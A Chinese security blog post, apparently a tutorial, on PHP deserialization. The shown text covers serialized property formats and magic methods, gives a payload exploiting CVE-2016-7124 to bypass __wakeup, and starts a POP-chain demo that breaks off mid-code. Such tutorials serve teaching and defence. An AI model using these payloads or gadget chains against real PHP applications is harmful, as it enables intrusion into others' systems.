<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="文章首发于 SECIN社区：https:&#x2F;&#x2F;www.sec-in.com&#x2F;article&#x2F;137">
<meta property="og:type" content="article">
<meta property="og:title" content="再谈 PHP 反序列化">
<meta property="og:url" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="M13n&#39;s Blog">
<meta property="og:description" content="文章首发于 SECIN社区：https:&#x2F;&#x2F;www.sec-in.com&#x2F;article&#x2F;137">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201552674.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200131027.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200248029.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201620913.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201629436.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201637025.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201649416.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201704046.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201738749.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200311935.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200319155.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200327296.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200341989.png">
<meta property="og:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200356402.png">
<meta property="article:published_time" content="2020-02-18T09:33:10.000Z">
<meta property="article:modified_time" content="2021-02-13T05:59:55.850Z">
<meta property="article:author" content="M13n">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201552674.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>再谈 PHP 反序列化</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/03/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/12/07/360%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AF%81%E4%B9%A6/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=再谈 PHP 反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=再谈 PHP 反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=再谈 PHP 反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=再谈 PHP 反序列化&body=Check out this article: http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=再谈 PHP 反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=再谈 PHP 反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=再谈 PHP 反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=再谈 PHP 反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=再谈 PHP 反序列化&description=&lt;p&gt;文章首发于 SECIN社区：&lt;a href=&#34;https://www.sec-in.com/article/137&#34;&gt;https://www.sec-in.com/article/137&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=再谈 PHP 反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%B1%9E%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">三种类属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-7124"><span class="toc-number">3.</span> <span class="toc-text">CVE-2016-7124</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">4.</span> <span class="toc-text">POP链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE"><span class="toc-number">4.1.</span> <span class="toc-text">知识回顾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demo1"><span class="toc-number">4.2.</span> <span class="toc-text">demo1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demo2"><span class="toc-number">4.3.</span> <span class="toc-text">demo2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">原生类利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ZipArchive-open"><span class="toc-number">5.1.</span> <span class="toc-text">ZipArchive::open</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient"><span class="toc-number">5.2.</span> <span class="toc-text">SoapClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Error-XSS"><span class="toc-number">5.3.</span> <span class="toc-text">Error XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exception-XSS"><span class="toc-number">5.4.</span> <span class="toc-text">Exception XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">5.5.</span> <span class="toc-text">多种姿势组合拳</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">6.</span> <span class="toc-text">反序列化字符逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%B8%80"><span class="toc-number">6.1.</span> <span class="toc-text">例子一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%BA%8C"><span class="toc-number">6.2.</span> <span class="toc-text">例子二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.</span> <span class="toc-text">Session 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E7%9B%B8%E5%85%B3"><span class="toc-number">7.1.</span> <span class="toc-text">参数相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%AE%E5%BC%82%E6%80%A7"><span class="toc-number">7.2.</span> <span class="toc-text">差异性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="toc-number">7.3.</span> <span class="toc-text">攻击手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#trick-1"><span class="toc-number">7.3.1.</span> <span class="toc-text">trick-1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#trick-2"><span class="toc-number">7.3.2.</span> <span class="toc-text">trick-2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%B8%80-1"><span class="toc-number">7.4.</span> <span class="toc-text">例子一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%BA%8C-1"><span class="toc-number">7.5.</span> <span class="toc-text">例子二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phar%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">8.</span> <span class="toc-text">Phar拓展攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phar%E7%AE%80%E4%BB%8B"><span class="toc-number">8.1.</span> <span class="toc-text">Phar简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6"><span class="toc-number">8.2.</span> <span class="toc-text">触发条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-%E9%80%92%E8%BF%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">9.</span> <span class="toc-text">HITCON  递进反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HITCON-2016-babytrick"><span class="toc-number">9.1.</span> <span class="toc-text">HITCON 2016 babytrick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HITCON-2017-Baby-Master-PHP"><span class="toc-number">9.2.</span> <span class="toc-text">HITCON 2017 Baby-Master-PHP</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        再谈 PHP 反序列化
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">M13n's Blog</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-02-18T09:33:10.000Z" itemprop="datePublished">2020-02-18</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/PHP-Sec/">PHP Sec</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="tag-link-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>文章首发于 SECIN社区：<a target="_blank" rel="noopener" href="https://www.sec-in.com/article/137">https://www.sec-in.com/article/137</a></p>
<span id="more"></span>



<h2 id="三种类属性"><a href="#三种类属性" class="headerlink" title="三种类属性"></a>三种类属性</h2><p><strong>Private 权限: 正常</strong><br><strong>Private 权限属性名: <code>%00类名%00属性名</code> 。且属性名长度改变</strong><br><strong>Protected 权限属性名: <code>%00*%00属性名</code> 。且属性名长度改变</strong></p>
<p>demo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;P2hm1n&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="string">&#x27;Secret&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="variable">$content</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line">file_put_contents(<span class="string">&#x27;./flag.txt&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201552674.png"></p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>具体可参考PHP手册: <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p>
<p><code>construct</code> 调用条件 :当一个类被初始化为实例时会调用(<code>unserialize()</code>时不会自动调用)<br><code>destruct</code> 调用条件 :当对象被销毁时会调用<br><code>sleep</code> 调用条件 :当一个类调用<code>serialize</code>进行序列化时会自动调用<br><code>wakeup</code> 调用条件 :当字符串要利用<code>unserialize</code>反序列化成一个类时会调用<br><code>get()</code> 调用条件:当从不可访问的属性读取数据<br><code>call()</code>调用条件: 当要调用的方法不存在或权限不足时自动调用<br><code>invoke()</code>调用条件: 当把一个类当作函数使用时自动调用</p>
<p><code>tostring</code> 当反序列化后的对象被当作字符串的时候调用。具体调用场景条件如下(引用自 @k0rz3n)</p>
<blockquote>
<p>(1) <code>echo ($obj) / print($obj)</code> 打印时会触发<br>(2) 反序列化对象与字符串连接时<br>(3) 反序列化对象参与格式化字符串时<br>(4) 反序列化对象与字符串进行<code>==</code>比较时（PHP进行<code>==</code>比较的时候会转换参数类型）<br>(5) 反序列化对象参与格式化SQL语句，绑定参数时<br>(6) 反序列化对象在经过php字符串函数，如 <code>strlen()</code>、<code>addslashes()</code>时<br>(7) 在<code>in_array()</code>方法中，第一个参数是反序列化对象，第二个参数的数组中有<code>toString</code>返回的字符串的时候<code>toString</code>会被调用<br>(8) 反序列化的对象作为 <code>class_exists()</code> 的参数的时候</p>
</blockquote>
<h2 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h2><p>CVE利用目的: 绕过魔法函数<code>__wakeup</code></p>
<p><strong>版本限制: PHP5 &lt; 5.6.25 | PHP7 &lt; 7.0.10</strong></p>
<p>核心原理: <a target="_blank" rel="noopener" href="https://paper.seebug.org/866/">PHP 内核层解析反序列化漏洞</a><br>s<br>绕过方法: 当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行</p>
<p>Bypass demo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;P2hm1n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Bypass&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;fail &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">unserialize(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload1 = O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;P2hm1n&quot;</span>;&#125;</span><br><span class="line"><span class="comment">// fail Bypass</span></span><br></pre></td></tr></table></figure>

<p>bypass payload </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload1 = O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;P2hm1n&quot;</span>;&#125;</span><br><span class="line"><span class="comment">// Bypass</span></span><br></pre></td></tr></table></figure>


<h2 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h2><h3 id="知识回顾"><a href="#知识回顾" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><a target="_blank" rel="noopener" href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/">挖掘暗藏ThinkPHP中的反序列利用链</a> 一文中总结的挺好了。</p>
<table>
<thead>
<tr>
<th align="left">方法名</th>
<th align="left">调用条件</th>
</tr>
</thead>
<tbody><tr>
<td align="left">__call</td>
<td align="left">调用不可访问或不存在的方法时被调用</td>
</tr>
<tr>
<td align="left">__callStatic</td>
<td align="left">调用不可访问或不存在的静态方法时被调用</td>
</tr>
<tr>
<td align="left">__clone</td>
<td align="left">进行对象clone时被调用，用来调整对象的克隆行为</td>
</tr>
<tr>
<td align="left">__constuct</td>
<td align="left">构建对象的时被调用；</td>
</tr>
<tr>
<td align="left">__debuginfo</td>
<td align="left">当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</td>
</tr>
<tr>
<td align="left">__destruct</td>
<td align="left">明确销毁对象或脚本结束时被调用；</td>
</tr>
<tr>
<td align="left">__get</td>
<td align="left">读取不可访问或不存在属性时被调用</td>
</tr>
<tr>
<td align="left">__invoke</td>
<td align="left">当以函数方式调用对象时被调用</td>
</tr>
<tr>
<td align="left">__isset</td>
<td align="left">对不可访问或不存在的属性调用isset()或empty()时被调用</td>
</tr>
<tr>
<td align="left">__set</td>
<td align="left">当给不可访问或不存在属性赋值时被调用</td>
</tr>
<tr>
<td align="left">__set_state</td>
<td align="left">当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。</td>
</tr>
<tr>
<td align="left">__sleep</td>
<td align="left">当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</td>
</tr>
<tr>
<td align="left">__toString</td>
<td align="left">当一个类被转换成字符串时被调用</td>
</tr>
<tr>
<td align="left">__unset</td>
<td align="left">对不可访问或不存在的属性进行unset时被调用</td>
</tr>
<tr>
<td align="left">__wakeup</td>
<td align="left">当使用unserialize时被调用，可用于做些对象的初始化操作</td>
</tr>
</tbody></table>
<ul>
<li>反序列化的常见起点<ul>
<li><code>__wakeup</code> 一定会调用</li>
<li><code>__destruct</code> 一定会调用</li>
<li><code>__toString</code> 当一个对象被反序列化后又被当做字符串使用</li>
</ul>
</li>
</ul>
<ul>
<li>反序列化的常见中间跳板:<ul>
<li><code>__toString</code> 当一个对象被当做字符串使用</li>
<li><code>__get</code> 读取不可访问或不存在属性时被调用</li>
<li><code>__set</code> 当给不可访问或不存在属性赋值时被调用</li>
<li><code>__isset</code> 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 <code>$this-&gt;$func();</code></li>
</ul>
</li>
</ul>
<ul>
<li>反序列化的常见终点:<ul>
<li><code>__call</code> 调用不可访问或不存在的方法时被调用</li>
<li><code>call_user_func</code> 一般php代码执行都会选择这里</li>
<li><code>call_user_func_array</code> 一般php代码执行都会选择这里</li>
</ul>
</li>
</ul>
<p>主要还是三点：</p>
<ol>
<li>起点</li>
<li>跳板</li>
<li>代码执行</li>
</ol>
<p>个人感觉核心是实例化对象可附值给变量,从而调用 + 各类魔术方法</p>
<h3 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h3><p>demo引用自 @twosmi1e 师傅 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3674">先知社区</a>  里的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">                <span class="variable">$s1</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span 